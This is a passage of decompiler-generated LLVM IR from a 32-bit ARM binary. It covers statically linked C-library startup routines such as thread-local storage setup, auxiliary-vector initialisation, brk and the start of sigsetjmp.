  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14c98 = load i32, i32* @r4, align 4
  store i32 %v3_14c98, i32* %stack_var_-36, align 4
  %v6_14c98 = load i32, i32* @r5, align 4
  %v15_14c98 = load i32, i32* @r8, align 4
  %v18_14c98 = load i32, i32* @sb, align 4
  %v21_14c98 = load i32, i32* @sl, align 4
  %v24_14c98 = load i32, i32* @fp, align 4
  %v27_14c98 = load i32, i32* @lr, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %sl.global-to-local, align 4
  %v4_14ca8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 112) to i32*), align 4
  store i32 %v4_14ca8, i32* %r3.global-to-local, align 4
  %v1_14cac = inttoptr i32 %v4_14ca8 to i32*
  %v2_14cac = load i32, i32* %v1_14cac, align 4
  store i32 %v2_14cac, i32* %r2.global-to-local, align 4
  %v2_14cb0 = icmp eq i32 %v2_14cac, 0
  %v0_14cb8 = load i32, i32* %r0.global-to-local, align 4
  %v0_14cbc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14cbc, i32* %ip.global-to-local, align 4
  br i1 %v2_14cb0, label %dec_label_pc_14e84, label %dec_label_pc_14cc4

dec_label_pc_14cc4:                               ; preds = %entry
  store i32 164, i32* %r3.global-to-local, align 4
  %v4_14cc8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 164) to i32*), align 4
  store i32 %v4_14cc8, i32* @lr, align 4
  store i32 %v2_14cac, i32* %r1.global-to-local, align 4
  %v1_14d10 = inttoptr i32 %v4_14cc8 to i32*
  %v2_14d1061 = load i32, i32* %v1_14d10, align 4
  %v4_14d1462 = mul i32 %v2_14d1061, 32
  %v5_14d1463 = add i32 %v4_14d1462, %v2_14cac
  store i32 %v5_14d1463, i32* %r3.global-to-local, align 4
  %v3_14d1865 = icmp ult i32 %v2_14cac, %v5_14d1463
  br i1 %v3_14d1865, label %dec_label_pc_14cd4, label %dec_label_pc_14e84.loopexit

dec_label_pc_14cd4:                               ; preds = %dec_label_pc_14cc4, %dec_label_pc_14d0c
  %v0_14cec66 = phi i32 [ %v1_14d0c, %dec_label_pc_14d0c ], [ %v2_14cac, %dec_label_pc_14cc4 ]
  %v1_14cd4 = inttoptr i32 %v0_14cec66 to i32*
  %v2_14cd4 = load i32, i32* %v1_14cd4, align 4
  store i32 %v2_14cd4, i32* %r3.global-to-local, align 4
  %v7_14cd8 = icmp eq i32 %v2_14cd4, 7
  br i1 %v7_14cd8, label %dec_label_pc_14ce0, label %dec_label_pc_14d0c

dec_label_pc_14ce0:                               ; preds = %dec_label_pc_14cd4
  %v1_14ce0 = add i32 %v0_14cec66, 20
  %v2_14ce0 = inttoptr i32 %v1_14ce0 to i32*
  %v3_14ce0 = load i32, i32* %v2_14ce0, align 4
  store i32 %v3_14ce0, i32* %r3.global-to-local, align 4
  %v1_14ce4 = add i32 %v0_14cec66, 28
  %v2_14ce4 = inttoptr i32 %v1_14ce4 to i32*
  %v3_14ce4 = load i32, i32* %v2_14ce4, align 4
  store i32 %v3_14ce4, i32* @r6, align 4
  %v1_14cec = add i32 %v0_14cec66, 16
  %v2_14cec = inttoptr i32 %v1_14cec to i32*
  %v3_14cec = load i32, i32* %v2_14cec, align 4
  store i32 %v3_14cec, i32* %r3.global-to-local, align 4
  %v1_14cf0 = add i32 %v0_14cec66, 8
  %v2_14cf0 = inttoptr i32 %v1_14cf0 to i32*
  %v3_14cf0 = load i32, i32* %v2_14cf0, align 4
  store i32 %v3_14cf0, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_14ce4, %v0_14cbc
  %v0_14cbc.v3_14ce4 = select i1 %tmp78, i32 %v0_14cbc, i32 %v3_14ce4
  store i32 %v0_14cbc.v3_14ce4, i32* %fp.global-to-local, align 4
  %v2_14d28 = icmp eq i32 %v3_14ce4, 0
  br i1 %v2_14d28, label %dec_label_pc_14d50, label %bb

dec_label_pc_14d0c:                               ; preds = %dec_label_pc_14cd4
  %v1_14d0c = add i32 %v0_14cec66, 32
  store i32 %v1_14d0c, i32* %r1.global-to-local, align 4
  %v2_14d10 = load i32, i32* %v1_14d10, align 4
  %v4_14d14 = mul i32 %v2_14d10, 32
  %v5_14d14 = add i32 %v4_14d14, %v2_14cac
  store i32 %v5_14d14, i32* %r3.global-to-local, align 4
  %v3_14d18 = icmp ult i32 %v1_14d0c, %v5_14d14
  br i1 %v3_14d18, label %dec_label_pc_14cd4, label %dec_label_pc_14d10.dec_label_pc_14e84.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_14ce0
  %v2_14d2c = add i32 %v3_14ce4, -1
  br label %dec_label_pc_14d54

dec_label_pc_14d50:                               ; preds = %dec_label_pc_14ce0, %dec_label_pc_14e84
  %v0_14d64.pre = phi i32 [ %v0_14d64.pre.pre, %dec_label_pc_14e84 ], [ ptrtoint (i32* @global_var_24010.405 to i32), %dec_label_pc_14ce0 ]
  %v1_14d54.pre = phi i32 [ %v1_14d54.pre.pre, %dec_label_pc_14e84 ], [ %v0_14cb8, %dec_label_pc_14ce0 ]
  %v1_14d7825 = phi i32 [ %v0_14e8c, %dec_label_pc_14e84 ], [ %v0_14cbc.v3_14ce4, %dec_label_pc_14ce0 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_14e84 ], [ %v3_14ce0, %dec_label_pc_14ce0 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_14e84 ], [ %v3_14cec, %dec_label_pc_14ce0 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_14e84 ], [ %v3_14cf0, %dec_label_pc_14ce0 ]
  br label %dec_label_pc_14d54

dec_label_pc_14d54:                               ; preds = %bb, %dec_label_pc_14d50
  %storemerge80 = phi i32 [ %v2_14d2c, %bb ], [ 0, %dec_label_pc_14d50 ]
  %v0_14d54 = phi i32 [ %v2_14d2c, %bb ], [ 0, %dec_label_pc_14d50 ]
  %storemerge = phi i32 [ %v3_14ce4, %bb ], [ 1, %dec_label_pc_14d50 ]
  %storemerge79 = phi i32 [ %v3_14ce4, %bb ], [ 1, %dec_label_pc_14d50 ]
  %v0_14d64 = phi i32 [ ptrtoint (i32* @global_var_24010.405 to i32), %bb ], [ %v0_14d64.pre, %dec_label_pc_14d50 ]
  %v1_14d54 = phi i32 [ %v0_14cb8, %bb ], [ %v1_14d54.pre, %dec_label_pc_14d50 ]
  %v1_14d78 = phi i32 [ %v0_14cbc.v3_14ce4, %bb ], [ %v1_14d7825, %dec_label_pc_14d50 ]
  %stack_var_-52.3 = phi i32 [ %v3_14ce0, %bb ], [ %stack_var_-52.0, %dec_label_pc_14d50 ]
  %stack_var_-48.3 = phi i32 [ %v3_14cec, %bb ], [ %stack_var_-48.0, %dec_label_pc_14d50 ]
  %stack_var_-44.3 = phi i32 [ %v3_14cf0, %bb ], [ %stack_var_-44.0, %dec_label_pc_14d50 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_14d54 = add i32 %v1_14d54, %v0_14d54
  %v2_14d58 = udiv i32 %v2_14d54, %storemerge
  store i32 %v2_14d58, i32* %r0.global-to-local, align 4
  %v2_14d5c = mul i32 %v2_14d58, %storemerge
  store i32 %v2_14d5c, i32* %sb.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_14d64 = add i32 %v0_14d64, 80
  %v3_14d64 = inttoptr i32 %v2_14d64 to i32*
  %v4_14d64 = load i32, i32* %v3_14d64, align 4
  store i32 %v4_14d64, i32* %r3.global-to-local, align 4
  %v1_14d68 = inttoptr i32 %v4_14d64 to i32*
  %v2_14d68 = load i32, i32* %v1_14d68, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_14d70 = add i32 %v1_14d78, 1168
  %v2_14d74 = add i32 %v1_14d70, %stack_var_-52.3
  %v2_14d78 = add i32 %v2_14d74, %v2_14d5c
  %v2_14d7c = add i32 %v2_14d78, %v2_14d68
  store i32 %v2_14d7c, i32* %r0.global-to-local, align 4
  %v1_14d80 = call i32 @__GI_sbrk(i32 %v2_14d7c)
  %v1_14d84 = load i32, i32* %fp.global-to-local, align 4
  %v1_14d8c = sub i32 0, %v1_14d84
  store i32 13008, i32* %r4.global-to-local, align 4
  %v2_14d84 = add i32 %v1_14d80, 1167
  %v1_14d94 = add i32 %v2_14d84, %v1_14d84
  %v2_14d98 = and i32 %v1_14d94, %v1_14d8c
  store i32 %v2_14d98, i32* @r5, align 4
  %v1_14da0 = load i32, i32* %sl.global-to-local, align 4
  %v3_14da0 = add i32 %v1_14da0, 13008
  %v4_14da0 = inttoptr i32 %v3_14da0 to i32*
  store i32 62, i32* %v4_14da0, align 4
  %v0_14da8 = load i32, i32* @r5, align 4
  %v1_14da8 = load i32, i32* %sb.global-to-local, align 4
  %v2_14da8 = add i32 %v1_14da8, %v0_14da8
  store i32 %v2_14da8, i32* @ip, align 4
  %v0_14dac = load i32, i32* %sl.global-to-local, align 4
  %v1_14dac = load i32, i32* %r4.global-to-local, align 4
  %v2_14dac = add i32 %v1_14dac, %v0_14dac
  store i32 %v2_14dac, i32* %r4.global-to-local, align 4
  %v2_14db0 = add i32 %v0_14dac, 14296
  store i32 %v2_14db0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_14da8, i32* @r0, align 4
  %v2_14dc4 = add i32 %v2_14dac, 16
  %v3_14dc4 = inttoptr i32 %v2_14dc4 to i32*
  store i32 %v2_14da8, i32* %v3_14dc4, align 4
  %v0_14dc8 = load i32, i32* %sb.global-to-local, align 4
  %v1_14dc8 = load i32, i32* %r8.global-to-local, align 4
  %v2_14dc8 = add i32 %v1_14dc8, 40
  %v3_14dc8 = inttoptr i32 %v2_14dc8 to i32*
  store i32 %v0_14dc8, i32* %v3_14dc8, align 4
  %v0_14dcc = load i32, i32* @r3, align 4
  %v1_14dcc = trunc i32 %v0_14dcc to i8
  %v2_14dcc = load i32, i32* %r4.global-to-local, align 4
  %v3_14dcc = add i32 %v2_14dcc, 20
  %v4_14dcc = inttoptr i32 %v3_14dcc to i8*
  store i8 %v1_14dcc, i8* %v4_14dcc, align 1
  %v0_14dd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14dd0 = add i32 %v0_14dd0, 8
  store i32 %v1_14dd0, i32* @r4, align 4
  %v0_14dd4 = call i32 @memcpy()
  %v0_14ddc = load i32, i32* @r4, align 4
  %v1_14ddc = load i32, i32* @r5, align 4
  %v2_14ddc = inttoptr i32 %v1_14ddc to i32*
  store i32 %v0_14ddc, i32* %v2_14ddc, align 4
  %v0_14de0 = load i32, i32* @r5, align 4
  store i32 %v0_14de0, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_14de0, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_f324.697 to i32))
  store i32 92, i32* %r3.global-to-local, align 4
  %v0_14df4 = load i32, i32* %sl.global-to-local, align 4
  %v2_14df4 = add i32 %v0_14df4, 92
  %v3_14df4 = inttoptr i32 %v2_14df4 to i32*
  %v4_14df4 = load i32, i32* %v3_14df4, align 4
  store i32 %v4_14df4, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 13520, i32* %r1.global-to-local, align 4
  %v2_14e00 = add i32 %v0_14df4, 64
  %v3_14e00 = inttoptr i32 %v2_14e00 to i32*
  %v4_14e00 = load i32, i32* %v3_14e00, align 4
  store i32 %v4_14e00, i32* %r0.global-to-local, align 4
  %v3_14e08 = add i32 %v0_14df4, 13520
  %v4_14e08 = inttoptr i32 %v3_14e08 to i32*
  store i32 64, i32* %v4_14e08, align 4
  %v1_14e10 = load i32, i32* %r8.global-to-local, align 4
  %v2_14e10 = add i32 %v1_14e10, 20
  %v3_14e10 = inttoptr i32 %v2_14e10 to i32*
  store i32 %stack_var_-44.3, i32* %v3_14e10, align 4
  %v1_14e18 = load i32, i32* %r8.global-to-local, align 4
  %v2_14e18 = add i32 %v1_14e18, 24
  %v3_14e18 = inttoptr i32 %v2_14e18 to i32*
  store i32 %stack_var_-48.3, i32* %v3_14e18, align 4
  %v1_14e20 = load i32, i32* %r0.global-to-local, align 4
  %v2_14e20 = inttoptr i32 %v1_14e20 to i32*
  store i32 1, i32* %v2_14e20, align 4
  %v1_14e28 = load i32, i32* %r8.global-to-local, align 4
  %v2_14e28 = add i32 %v1_14e28, 28
  %v3_14e28 = inttoptr i32 %v2_14e28 to i32*
  store i32 %stack_var_-52.3, i32* %v3_14e28, align 4
  %v0_14e30 = load i32, i32* @r6, align 4
  %v2_14e30 = icmp eq i32 %v0_14e30, 0
  %v1_14e34 = load i32, i32* %r8.global-to-local, align 4
  %v2_14e34 = add i32 %v1_14e34, 44
  %v3_14e34 = inttoptr i32 %v2_14e34 to i32*
  store i32 1, i32* %v3_14e34, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_14e3c = load i32, i32* %sl.global-to-local, align 4
  %v1_14e3c = load i32, i32* %r1.global-to-local, align 4
  %v2_14e3c = add i32 %v1_14e3c, %v0_14e3c
  store i32 %v2_14e3c, i32* %r2.global-to-local, align 4
  %v1_14e40 = load i32, i32* @r6, align 4
  br i1 %v2_14e30, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_14d54
  store i32 %v1_14e40, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_14e4c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_14e4c35 = add i32 %v1_14e4c34, 32
  %v3_14e4c36 = inttoptr i32 %v2_14e4c35 to i32*
  store i32 %v1_14e40, i32* %v3_14e4c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_14d54
  %v2_14e44 = add i32 %v1_14e40, -1
  store i32 %v2_14e44, i32* %r0.global-to-local, align 4
  %v1_14e4c = load i32, i32* %r8.global-to-local, align 4
  %v2_14e4c = add i32 %v1_14e4c, 32
  %v3_14e4c = inttoptr i32 %v2_14e4c to i32*
  store i32 %v1_14e40, i32* %v3_14e4c, align 4
  %v1_14e50 = load i32, i32* @r6, align 4
  store i32 %v1_14e50, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_14e54 = load i32, i32* %r8.global-to-local, align 4
  %v1_14e54 = load i32, i32* %r2.global-to-local, align 4
  %v2_14e54 = add i32 %v1_14e54, 28
  %v3_14e54 = inttoptr i32 %v2_14e54 to i32*
  store i32 %v0_14e54, i32* %v3_14e54, align 4
  %v0_14e58 = load i32, i32* %r2.global-to-local, align 4
  %v1_14e58 = load i32, i32* %ip.global-to-local, align 4
  %v2_14e58 = inttoptr i32 %v1_14e58 to i32*
  store i32 %v0_14e58, i32* %v2_14e58, align 4
  %v0_14e5c = load i32, i32* %r0.global-to-local, align 4
  %v1_14e5c = load i32, i32* %r3.global-to-local, align 4
  %v2_14e5c = add i32 %v1_14e5c, %v0_14e5c
  store i32 %v2_14e5c, i32* %r0.global-to-local, align 4
  %v1_14e60 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_14e30, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_14e68.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_14e68 = phi i32 [ %v0_14e68.pre, %._crit_edge ], [ %v1_14e60, %bb54 ]
  %v2_14e64 = udiv i32 %v2_14e5c, %v1_14e60
  %v2_14e68 = load i32, i32* %sb.global-to-local, align 4
  %v3_14e68 = mul i32 %v2_14e64, %v0_14e68
  %v4_14e68 = add i32 %v2_14e68, %v3_14e68
  store i32 %v4_14e68, i32* @r0, align 4
  %v0_14e6c = load i32, i32* %fp.global-to-local, align 4
  %v2_14e6c = icmp ult i32 %v0_14e6c, 16
  %v0_14e6c. = select i1 %v2_14e6c, i32 16, i32 %v0_14e6c
  store i32 %v0_14e6c., i32* @r1, align 4
  %v2_14e7c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14e7c, i32* @r4, align 4
  store i32 %v6_14c98, i32* @r5, align 4
  store i32 %v15_14c98, i32* %r8.global-to-local, align 4
  store i32 %v18_14c98, i32* %sb.global-to-local, align 4
  store i32 %v21_14c98, i32* %sl.global-to-local, align 4
  store i32 %v24_14c98, i32* %fp.global-to-local, align 4
  store i32 %v27_14c98, i32* @lr, align 4
  %v0_14e80 = call i32 @init_static_tls()
  store i32 %v0_14e80, i32* %r0.global-to-local, align 4
  %v0_14e8c.pre = load i32, i32* @ip, align 4
  %v1_14d54.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_14d64.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14e84

dec_label_pc_14d10.dec_label_pc_14e84.loopexit_crit_edge: ; preds = %dec_label_pc_14d0c
  br label %dec_label_pc_14e84.loopexit

dec_label_pc_14e84.loopexit:                      ; preds = %dec_label_pc_14d10.dec_label_pc_14e84.loopexit_crit_edge, %dec_label_pc_14cc4
  br label %dec_label_pc_14e84

dec_label_pc_14e84:                               ; preds = %dec_label_pc_14e84.loopexit, %entry, %bb55
  %v0_14d64.pre.pre = phi i32 [ ptrtoint (i32* @global_var_24010.405 to i32), %dec_label_pc_14e84.loopexit ], [ ptrtoint (i32* @global_var_24010.405 to i32), %entry ], [ %v0_14d64.pre.pre.pre, %bb55 ]
  %v1_14d54.pre.pre = phi i32 [ %v0_14cb8, %dec_label_pc_14e84.loopexit ], [ %v0_14cb8, %entry ], [ %v1_14d54.pre.pre.pre, %bb55 ]
  %v0_14e8c = phi i32 [ %v0_14cbc, %dec_label_pc_14e84.loopexit ], [ %v0_14cbc, %entry ], [ %v0_14e8c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_14e8c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14d50

; uselistorder directives
  uselistorder i32 %v0_14e8c, { 1, 0 }
  uselistorder i32 %v1_14e40, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14dac, { 1, 0 }
  uselistorder i32 %v2_14da8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_14d0c, { 2, 1, 0 }
  uselistorder i32 %v3_14ce4, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_14cec66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_14d10, { 1, 0 }
  uselistorder i32 %v0_14cbc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_14cb8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_14cac, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 11, 8, 9, 10, 0, 12, 13, 14 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 1, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 2, 3, 1 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 13520, { 0, 2, 1 }
  uselistorder i32 -4096, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 3, 2, 1, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_14e84, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_14d54, { 1, 0 }
  uselistorder label %dec_label_pc_14d50, { 1, 0 }
  uselistorder label %dec_label_pc_14cd4, { 1, 0 }
}

define i32 @function_14ea4(i64* %arg1) local_unnamed_addr {
dec_label_pc_14ea4:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_14ea4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14ea4, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_14ea4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_14ea4, %bb
  %v10_14ec4 = phi i32 [ %tmp, %dec_label_pc_14ea4 ], [ 0, %bb ]
  ret i32 %v10_14ec4

; uselistorder directives
  uselistorder label %.thread7, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_14ed0 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_14ed0
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r2.global-to-local, align 4
  %v4_14ee0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 164) to i32*), align 4
  %v4_14ee8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 112) to i32*), align 4
  store i32 %v4_14ee8, i32* %r1.global-to-local, align 4
  %v1_14eec = add i32 %arg1, 44
  %v2_14eec = inttoptr i32 %v1_14eec to i32*
  %v3_14eec = load i32, i32* %v2_14eec, align 4
  %v1_14ef0 = add i32 %arg1, 28
  %v2_14ef0 = inttoptr i32 %v1_14ef0 to i32*
  %v3_14ef0 = load i32, i32* %v2_14ef0, align 4
  store i32 %v3_14ef0, i32* %r2.global-to-local, align 4
  %v2_14ef4 = inttoptr i32 %v4_14ee0 to i32*
  store i32 %v3_14eec, i32* %v2_14ef4, align 4
  %v0_14ef8 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ef8 = load i32, i32* %r1.global-to-local, align 4
  %v2_14ef8 = inttoptr i32 %v1_14ef8 to i32*
  store i32 %v0_14ef8, i32* %v2_14ef8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 112, { 2, 3, 4, 6, 0, 7, 5, 1, 8 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 164) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_14f04(i32 %arg1) local_unnamed_addr {
dec_label_pc_14f04:
  %v0_14f04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14f04, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14f04
  %v2_14f04 = load i32, i32* @r4, align 4
  %v5_14f04 = udiv i32 %v2_14f04, 2
  %v6_14f04 = and i32 %v5_14f04, %arg1
  %v5_14f08 = sub nsw i32 32, %v6_14f04
  %v6_14f08 = shl i32 %v6_14f04, %v5_14f08
  %v9_14f08 = and i32 %v6_14f08, %v6_14f04
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14f04, %bb
  %v10_14f08 = phi i32 [ %arg1, %dec_label_pc_14f04 ], [ %v9_14f08, %bb ]
  ret i32 %v10_14f08

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_14f14 = add i32 %arg1, 40
  store i32 %v1_14f14, i32* %r2.global-to-local, align 4
  %v1_14f18 = inttoptr i32 %v1_14f14 to i32*
  %v2_14f18 = load i32, i32* %v1_14f18, align 4
  store i32 %v2_14f18, i32* %r2.global-to-local, align 4
  %v3_14f18 = add i32 %arg1, 44
  %v4_14f18 = inttoptr i32 %v3_14f18 to i32*
  %v5_14f18 = load i32, i32* %v4_14f18, align 4
  store i32 %v5_14f18, i32* %r3.global-to-local, align 4
  %v0_14f1c = call i32 @__aeabi_read_tp()
  %v1_14f20 = inttoptr i32 %v0_14f1c to i32*
  %v2_14f20 = load i32, i32* %v1_14f20, align 4
  store i32 %v2_14f20, i32* %r1.global-to-local, align 4
  %v3_14f24 = mul i32 %v5_14f18, 8
  store i32 %v3_14f24, i32* %r3.global-to-local, align 4
  %v1_14f28 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f28 = add i32 %v1_14f28, %v0_14f1c
  %v3_14f2c = add i32 %v3_14f24, %v2_14f20
  %v4_14f2c = inttoptr i32 %v3_14f2c to i32*
  store i32 %v2_14f28, i32* %v4_14f2c, align 4
  %v0_14f30 = load i32, i32* %r3.global-to-local, align 4
  %v1_14f30 = load i32, i32* %r1.global-to-local, align 4
  %v2_14f30 = add i32 %v1_14f30, %v0_14f30
  store i32 %v2_14f30, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_14f38 = add i32 %v2_14f30, 4
  %v5_14f38 = inttoptr i32 %v4_14f38 to i8*
  store i8 1, i8* %v5_14f38, align 1
  %v0_14f3c = load i32, i32* @r4, align 4
  %v1_14f3c = add i32 %v0_14f3c, 20
  store i32 %v1_14f3c, i32* %r1.global-to-local, align 4
  %v1_14f40 = inttoptr i32 %v1_14f3c to i32*
  %v2_14f40 = load i32, i32* %v1_14f40, align 4
  store i32 %v2_14f40, i32* @r1, align 4
  %v3_14f40 = add i32 %v0_14f3c, 24
  %v4_14f40 = inttoptr i32 %v3_14f40 to i32*
  %v5_14f40 = load i32, i32* %v4_14f40, align 4
  store i32 %v5_14f40, i32* %r2.global-to-local, align 4
  %v5_14f44 = call i32 @__GI_mempcpy(i32 %v2_14f28, i32 %v2_14f40, i32 %v5_14f40, i32 1)
  %v0_14f48 = load i32, i32* @r4, align 4
  %v1_14f48 = add i32 %v0_14f48, 28
  store i32 %v1_14f48, i32* %r3.global-to-local, align 4
  %v1_14f4c = inttoptr i32 %v1_14f48 to i32*
  %v2_14f4c = load i32, i32* %v1_14f4c, align 4
  store i32 %v2_14f4c, i32* %r2.global-to-local, align 4
  %v3_14f4c = add i32 %v0_14f48, 24
  %v4_14f4c = inttoptr i32 %v3_14f4c to i32*
  %v5_14f4c = load i32, i32* %v4_14f4c, align 4
  store i32 %v5_14f4c, i32* %r3.global-to-local, align 4
  %v2_14f50 = sub i32 %v5_14f4c, %v2_14f4c
  store i32 %v2_14f50, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_14f58 = inttoptr i32 %v5_14f44 to i8*
  %v4_14f58 = call i32 @__GI_memset(i8* %v3_14f58, i32 0, i32 %v2_14f50)
  ret i32 %v4_14f58

; uselistorder directives
  uselistorder i32 %v3_14f24, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_14fa8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 14348) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_14fbc = load i32, i32* @r0, align 4
  %v1_14fc0 = inttoptr i32 %v0_14fbc to i32*
  %v2_14fc0 = load i32, i32* @r4, align 4
  store i32 %v2_14fc0, i32* %v1_14fc0, align 4
  %v3_14fc0 = add i32 %v0_14fbc, 4
  %v4_14fc0 = inttoptr i32 %v3_14fc0 to i32*
  %v5_14fc0 = load i32, i32* @r5, align 4
  store i32 %v5_14fc0, i32* %v4_14fc0, align 4
  %v6_14fc0 = add i32 %v0_14fbc, 8
  %v7_14fc0 = inttoptr i32 %v6_14fc0 to i32*
  %v8_14fc0 = load i32, i32* @r6, align 4
  store i32 %v8_14fc0, i32* %v7_14fc0, align 4
  %v9_14fc0 = add i32 %v0_14fbc, 12
  %v10_14fc0 = inttoptr i32 %v9_14fc0 to i32*
  %v11_14fc0 = load i32, i32* @r7, align 4
  store i32 %v11_14fc0, i32* %v10_14fc0, align 4
  %v12_14fc0 = add i32 %v0_14fbc, 16
  %v13_14fc0 = inttoptr i32 %v12_14fc0 to i32*
  %v14_14fc0 = load i32, i32* @r8, align 4
  store i32 %v14_14fc0, i32* %v13_14fc0, align 4
  %v15_14fc0 = add i32 %v0_14fbc, 20
  %v16_14fc0 = inttoptr i32 %v15_14fc0 to i32*
  %v17_14fc0 = load i32, i32* @sb, align 4
  store i32 %v17_14fc0, i32* %v16_14fc0, align 4
  %v18_14fc0 = add i32 %v0_14fbc, 24
  %v19_14fc0 = inttoptr i32 %v18_14fc0 to i32*
  %v20_14fc0 = load i32, i32* @sl, align 4
